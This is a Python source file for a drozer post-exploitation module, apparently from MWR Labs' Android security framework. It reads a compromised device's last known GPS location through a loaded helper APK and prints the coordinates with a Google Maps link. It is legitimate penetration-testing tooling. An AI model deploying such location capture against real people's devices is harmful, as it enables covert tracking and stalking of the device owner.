from drozer.modules import common, Module

class Location(Module, common.ClassLoader):

    name = "Get last known GPS coordinates of user"
    description = "Show the last known location of the user making use of the most accurate location source available."
    examples = """
dz> run post.capture.location
Latitude, Longitude: 37.422217,-122.084101
Google maps link: https://www.google.com/maps/place/37.422217,-122.084101
"""
    author = "Tyrone (@mwrlabs)"
    date = "2014-11-15"
    license = "BSD (3 clause)"
    path = ["post", "capture"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    def execute(self, arguments):

        cls = self.loadClass("LocationHelper.apk", "LocationHelper", relative_to=__file__)
        location = self.new(cls, self.getContext())
        lastKnown = location.getLocation()

        if len(lastKnown) > 0:
            self.stdout.write("Latitude, Longitude: %s\n" % lastKnown)
            self.stdout.write("Google Maps link: https://www.google.com/maps/place/%s\n" % lastKnown)
        else:
            self.stdout.write("[-] No known last location\n")